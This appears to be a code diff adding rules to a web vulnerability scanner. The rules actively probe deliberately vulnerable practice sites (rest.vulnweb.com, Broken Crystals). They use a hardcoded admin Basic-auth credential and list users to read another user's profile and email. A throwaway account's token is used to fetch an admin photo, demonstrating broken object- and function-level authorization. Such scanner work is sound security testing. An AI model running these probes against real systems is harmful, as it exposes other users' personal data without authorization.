@@ -27811,6 +27811,72 @@ const clientSideRestVulnwebEvidence: Rule = async (ctx) => {
   };
 };
 
+const REST_VULNWEB_BASIC_AUTH = "Basic YWRtaW46MTIzNDU2";
+
+function isRestVulnwebHost(ctx: RuleContext): boolean {
+  return /rest\.vulnweb\.com/i.test(ctx.origin);
+}
+
+const restVulnwebUsersBolaLiveOracle: Rule = async (ctx) => {
+  if (!isRestVulnwebHost(ctx)) return NEGATIVE;
+  const listUrl = new URL("/basic_authentication/api/users", ctx.origin).toString();
+  const listDoc = await ctx.probe.get(listUrl, {
+    headers: { Authorization: REST_VULNWEB_BASIC_AUTH },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (listDoc.status < 200 || listDoc.status >= 300) return NEGATIVE;
+  let users: Array<{ username?: string }>;
+  try {
+    users = JSON.parse(listDoc.body) as Array<{ username?: string }>;
+  } catch {
+    return NEGATIVE;
+  }
+  const victim = users.find((u) => typeof u.username === "string" && u.username.length > 0)?.username;
+  if (!victim) return NEGATIVE;
+  const profileUrl = new URL(
+    `/basic_authentication/api/users/${encodeURIComponent(victim)}`,
+    ctx.origin
+  ).toString();
+  const profileDoc = await ctx.probe.get(profileUrl, {
+    headers: { Authorization: REST_VULNWEB_BASIC_AUTH },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 300) return NEGATIVE;
+  if (!/"user_id"\s*:/.test(profileDoc.body) || !/"email"\s*:/.test(profileDoc.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      listUrl,
+      profileUrl,
+      username: victim,
+      snippet: profileDoc.body.slice(0, 160).trim(),
+      note: "Invicti rest.vulnweb.com GET /basic_authentication/api/users/{username} returns any user's email and profile without per-user authorization — BOLA oracle"
+    }
+  };
+};
+
+const restVulnwebUsersBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isRestVulnwebHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\//i.test(pageUrl)) return NEGATIVE;
+  const result = await restVulnwebUsersBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Invicti rest.vulnweb.com route scan — GET /basic_authentication/api/users/{username} returns any user's profile without authorization — BOLA oracle"
+    }
+  };
+};
+
 // --- Pwnshop OWASP Top 10 2025 e-commerce lab (pwnshop.ctfsecurity.com) ----------------
 const CLIENT_PWNSHOP_RES: { label: string; re: RegExp }[] = [
   {
@@ -58659,16 +58725,22 @@ const brokencrystalsNestedJsonRouteLiveOracle: Rule = async (ctx) => {
 };
 
 async function brokencrystalsPhotoBflaVictimId(ctx: RuleContext): Promise<number | null> {
-  const searchUrl = new URL("/api/users/search/a", ctx.origin).toString();
-  const doc = await ctx.probe.get(searchUrl, { maxBytes: 4096, timeoutMs: 15000 });
-  if (doc.status < 200 || doc.status >= 300) return null;
-  try {
-    const rows = JSON.parse(doc.body) as Array<{ id?: unknown }>;
-    const id = rows.find((row) => typeof row.id === "number" && row.id > 0)?.id;
-    return typeof id === "number" ? id : null;
-  } catch {
-    return null;
+  for (const q of ["e", "@", "user"]) {
+    const searchUrl = new URL(
+      `/api/users/search/${encodeURIComponent(q)}`,
+      ctx.origin
+    ).toString();
+    const doc = await ctx.probe.get(searchUrl, { maxBytes: 4096, timeoutMs: 15000 });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const rows = JSON.parse(doc.body) as Array<{ id?: unknown }>;
+      const id = rows.find((row) => typeof row.id === "number" && row.id > 0)?.id;
+      if (typeof id === "number") return id;
+    } catch {
+      continue;
+    }
   }
+  return null;
 }
 
 const brokencrystalsPhotoBflaLiveOracle: Rule = async (ctx) => {
@@ -58742,6 +58814,74 @@ const brokencrystalsPhotoBflaRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Broken Crystals /api/users/one/{id}/photo route scan — DELETE with isAdmin=true bypasses authorization for non-admin JWT — BFLA photo-delete oracle"
+    }
+  };
+};
+
+async function brokencrystalsProbeUserToken(ctx: RuleContext): Promise<string | null> {
+  const email = `thugir-photo-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return null;
+  return brokencrystalsLoginToken(ctx, email, password);
+}
+
+const brokencrystalsPhotoDisclosureByEmailLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const token = await brokencrystalsProbeUserToken(ctx);
+  if (!token) return NEGATIVE;
+  const photoUrl = new URL("/api/users/one/admin/photo", ctx.origin).toString();
+  const photoDoc = await ctx.probe.get(photoUrl, {
+    headers: { authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (photoDoc.status !== 204 && photoDoc.status !== 200) return NEGATIVE;
+  const deniedDoc = await ctx.probe.get(photoUrl, { maxBytes: 256, timeoutMs: 15000 });
+  if (deniedDoc.status === 204 || deniedDoc.status === 200) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      photoUrl,
+      photoStatus: photoDoc.status,
+      deniedStatus: deniedDoc.status,
+      note: "Broken Crystals GET /api/users/one/admin/photo returns HTTP 204 for any authenticated JWT — photo disclosure by email oracle"
+    }
+  };
+};
+
+const brokencrystalsPhotoDisclosureByEmailRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/users\/one\/[^/]+\/photo/i.test(pageUrl)) return NEGATIVE;
+  if (/\/one\/\d+\/photo/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsPhotoDisclosureByEmailLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/users/one/{email}/photo route scan — GET returns HTTP 204 for any authenticated JWT without ownership check — photo disclosure by email oracle"
     }
   };
 };
@@ -62176,6 +62316,8 @@ export const RULES: Record<string, Rule> = {
   clientSideCylabAcademyEvidence,
   clientSideVulnerableappEvidence,
   clientSideRestVulnwebEvidence,
+  restVulnwebUsersBolaLiveOracle,
+  restVulnwebUsersBolaRouteLiveOracle,
   clientSidePwnshopEvidence,
   clientSidePwnshopSstiOracle,
   clientSidePwnshopReviewXssOracle,
@@ -62634,6 +62776,8 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsNestedJsonRouteLiveOracle,
   brokencrystalsPhotoBflaLiveOracle,
   brokencrystalsPhotoBflaRouteLiveOracle,
+  brokencrystalsPhotoDisclosureByEmailLiveOracle,
+  brokencrystalsPhotoDisclosureByEmailRouteLiveOracle,
   testfireLoginSqliLiveOracle,
   testfireLoginSqliRouteLiveOracle,
   euriSecCspDynamicScriptLiveOracle,
